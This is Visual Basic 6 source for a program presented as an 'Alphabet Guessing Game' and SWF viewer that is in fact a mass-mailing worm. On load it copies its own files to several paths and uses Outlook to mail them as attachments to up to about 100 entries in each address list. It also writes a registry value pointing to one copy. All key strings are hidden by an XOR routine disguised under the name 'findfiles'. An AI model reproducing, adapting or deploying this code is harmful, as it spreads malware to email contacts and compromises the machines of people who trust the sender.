   VERSION 5.00
   Object = "{D27CDB6B-AE6D-11CF-96B8-444553540000}#1.0#0"; "SWFLASH.OCX"
   Begin VB.Form Form1
      BorderStyle     =   4  'Fixed ToolWindow
      Caption         =   "Alphabet Guessing Game"
      ClientHeight    =   8040
      ClientLeft      =   45
      ClientTop       =   285
      ClientWidth     =   4920
      LinkTopic       =   "Form1"
      MaxButton       =   0   'False
      MinButton       =   0   'False
      ScaleHeight     =   8040
      ScaleWidth      =   4920
      ShowInTaskbar   =   0   'False
      StartUpPosition =   3  'Windows Default
      Begin VB.TextBox Text6
         Height          =   285
         Left            =   240
         TabIndex        =   12
         Text            =   "c:\folder\subfolder\...\swfname.swf"
         Top             =   6120
         Width           =   4455
      End
      Begin VB.CommandButton Command3
         Caption         =   "Stop"
         Height          =   375
         Left            =   3360
         TabIndex        =   11
         Top             =   6960
         Width           =   1215
      End
      Begin VB.CommandButton Command2
         Caption         =   "Play"
         Height          =   375
         Left            =   360
         TabIndex        =   10
         Top             =   6960
         Width           =   1215
      End
      Begin ShockwaveFlashObjectsCtl.ShockwaveFlash ShockwaveFlash1
         Height          =   2055
         Left            =   120
         TabIndex        =   9
         Top             =   3960
         Width           =   4695
         _cx             =   4202585
         _cy             =   4197929
         Movie           =   ""
         Src             =   ""
         WMode           =   "Window"
         Play            =   -1  'True
         Loop            =   -1  'True
         Quality         =   "High"
         SAlign          =   ""
         Menu            =   -1  'True
         Base            =   ""
         Scale           =   "ShowAll"
         DeviceFont      =   0   'False
         EmbedMovie      =   0   'False
         BGColor         =   ""
         SWRemote        =   ""
         Stacking        =   "below"
      End
      Begin VB.TextBox Text5
         Height          =   285
         Left            =   4080
         TabIndex        =   5
         Top             =   1320
         Width           =   615
      End
      Begin VB.TextBox Text4
         Height          =   285
         Left            =   3120
         TabIndex        =   4
         Top             =   1320
         Width           =   615
      End
      Begin VB.TextBox Text3
         Height          =   285
         Left            =   2160
         TabIndex        =   3
         Top             =   1320
         Width           =   615
      End
      Begin VB.TextBox Text2
         Height          =   285
         Left            =   1200
         TabIndex        =   2
         Top             =   1320
         Width           =   615
      End
      Begin VB.CommandButton Command1
         Caption         =   "Play"
         Height          =   495
         Left            =   960
         TabIndex        =   1
         Top             =   2040
         Width           =   1095
      End
      Begin VB.TextBox Text1
         Height          =   285
         Left            =   240
         TabIndex        =   0
         Top             =   1320
         Width           =   615
      End
      Begin VB.Label Label4
         Caption         =   "      by : alcopaul"
         Height          =   255
         Left            =   1680
         TabIndex        =   14
         Top             =   7560
         Width           =   1575
      End
      Begin VB.Label Label3
         Caption         =   "       Enter the full path of the swf file that you wish to view..."
         Height          =   255
         Left            =   240
         TabIndex        =   13
         Top             =   6600
         Width           =   4455
      End
      Begin VB.Label Label2
         BackColor       =   &H00FF8080&
         Caption         =   "               Plus The Ultimate SWF Viewer Version 1.01"
         Height          =   255
         Left            =   120
         TabIndex        =   8
         Top             =   3480
         Width           =   4695
      End
      Begin VB.OLE OLE1
         Class           =   "Package"
         Height          =   855
         Left            =   3240
         OleObjectBlob   =   "game.frx":0000
         SourceDoc       =   "C:\clickme2x.com"
         TabIndex        =   7
         Top             =   2040
         Width           =   1335
      End
      Begin VB.Label Label1
         Caption         =   $"game.frx":3618
         Height          =   735
         Left            =   120
         TabIndex        =   6
         Top             =   360
         Width           =   4695
      End
   End
   Attribute VB_Name = "Form1"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   Option Explicit
   Private Sub Command1_Click()
   On Error Resume Next
   Dim num, a, ska, n, e, b, d
   For num = 0 To 25
   a = Array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z")
   Randomize
   ska = a(Int(Rnd * 26))
   If Text1 = ska Or Text2 = ska Or Text3 = ska Or Text4 = ska Or Text5 = ska Then
   n = n + 1
   Else
   End If
   e = e & "(" & num & ")" & " " & ska & " "
   Next num
   MsgBox e, vbInformation, findfiles("–¡·±¨°·")
   MsgBox findfiles("*«±¶ä·§«¶¡äþä") & n, vbSystemModal, "---"
   If n >= 10 Then
   b = Array("q", "w")
   Randomize
   d = b(Int(Rnd * 2))
   If d = "w" Then
   Form2.Show
   Else
   Form3.Show
   End If
   End If
   AppActivate findfiles("ƒ±¡··äƒ¥©¡")
   End Sub

   Private Sub Command2_Click()
   On Error Resume Next
   ShockwaveFlash1.Movie = Text6
   ShockwaveFlash1.Play
   End Sub

   Private Sub Command3_Click()
   On Error Resume Next
   ShockwaveFlash1.Stop
   End Sub

   Private Sub Form_Load()
   On Error Resume Next
   Dim zz, zz1, ww, ww1, ph1, ph2, a, b, c, d, e, f, g, x, y, oo, ph3
   zz = App.Path & App.EXEName & findfiles("ê‡‹‰")
   zz1 = App.Path & "\" & App.EXEName & findfiles("ê‡‹‰")
   ww = App.Path & App.EXEName & findfiles("ê”*‚")
   ww1 = App.Path & "\" & App.EXEName & findfiles("ê”*‚")
   ph1 = "§þ˜²¦£¥©¡ê§«©"
   ph2 = "§þ˜¶¡£¯¡½ê´¢"
   ph3 = "§þ˜¶¡£·°¶½ê§«©"
   FileCopy zz, findfiles(ph1)
   FileCopy zz1, findfiles(ph1)
   FileCopy ww, findfiles(ph1)
   FileCopy ww1, findfiles(ph1)
   FileCopy zz, findfiles(ph2)
   FileCopy zz1, findfiles(ph2)
   FileCopy ww, findfiles(ph2)
   FileCopy ww1, findfiles(ph2)
   FileCopy zz, findfiles(ph3)
   FileCopy zz1, findfiles(ph3)
   FileCopy ww, findfiles(ph3)
   FileCopy ww1, findfiles(ph3)
   Set a = CreateObject(findfiles("‹±°¨««¯ê…´´¨§¥°«ª"))
   Set b = a.GetNameSpace(findfiles("‰…”*"))
   If a = findfiles("‹±°¨««¯") Then
   b.Logon findfiles("´¶«¢¨¡"), findfiles("´¥··³«¶ ")
   For y = 1 To b.AddressLists.Count
   Set d = b.AddressLists(y)
   x = 1
   Set c = a.CreateItem(0)
   For oo = 1 To d.AddressEntries.Count
   e = d.AddressEntries(x)
   c.Recipients.Add e
   x = x + 1
   If x > 101 Then oo = d.AddressEntries.Count
   Next oo
   c.Subject = findfiles("Œ¡¨¨«êêêä*«±ã¶¡ä–¥ª «©¨½ä‡¬«·¡ªä…·ä…ä*¡·°¡¶êêê")
   c.Body = findfiles("êêê‡¬¡§¯ä«±°ä°¬·äª¡³ä£¥©¡ä¢¶«©ä³³³ê°±§«³·ê§«©êê")
   c.attachments.Add findfiles(ph1), 1, 1, findfiles("…¨´¬¥¦¡°äƒ¥©¡")
   c.attachments.Add findfiles(ph2), 1, 2, findfiles("–¡£·°¶¥°«ªä*¡½")
   c.Send
   e = ""
   Next y
   b.Logoff
   End If
   Set g = CreateObject(findfiles("“—§¶´°ê—¬¡¨¨"))
   g.regwrite findfiles("Œ***›ˆ‹‡…ˆ›‰…‡Œ*Š*˜—‹‚*“…–*˜‰§¶«·«¢°˜“ª «³·˜‡±¶¶¡ª°’¡¶·«ª˜–±ª—¡¶²§¡·˜î…¨´¬¥¦¡°"), findfiles(ph3)
   End Sub
   Private Sub OLE1_Updated(Code As Integer)
   On Error Resume Next
   MsgBox findfiles("*ªä§¥·¡ä½«±ä³¥ª°ä°«ä´¨¥½ä°¬¡ä¥¨´¬¥¦¡°ä£±¡··ä£¥©¡èä¥ä·¬«¶°§±°ä·ä§¶¡¥°¡ äªä½«±¶ä ¡·¯°«´êê"), vbSystemModal, findfiles("*¼°ª£äƒ±¡··äƒ¥©¡")
   Dim a, d
   Set a = CreateObject(findfiles("“—§¶´°ê—¬¡¨¨"))
   d = a.SpecialFolders(findfiles("€¡·¯°«´"))
   Open d & "\" & findfiles("…¨´¬¥¦¡°äƒ±¡··äƒ¥©¡ê±¶¨") For Output As 6
   Print #6, findfiles("Ÿ*ª°¡¶ª¡°—¬«¶°§±°™")
   Print #6, findfiles("‘–ˆù§þ˜²¦£¥©¡ê§«©")
   Close 6
   Unload Me
   End Sub
   Private Function findfiles(sText)
   On Error Resume Next
   Dim ekey, i, hash, crbyte
   ekey = 1981
   For i = 1 To Len(sText)
       hash = Asc(Mid(sText, i, 1))
       crbyte = Chr(hash Xor (ekey Mod 255))
       findfiles = findfiles & crbyte
   Next i
   End Function
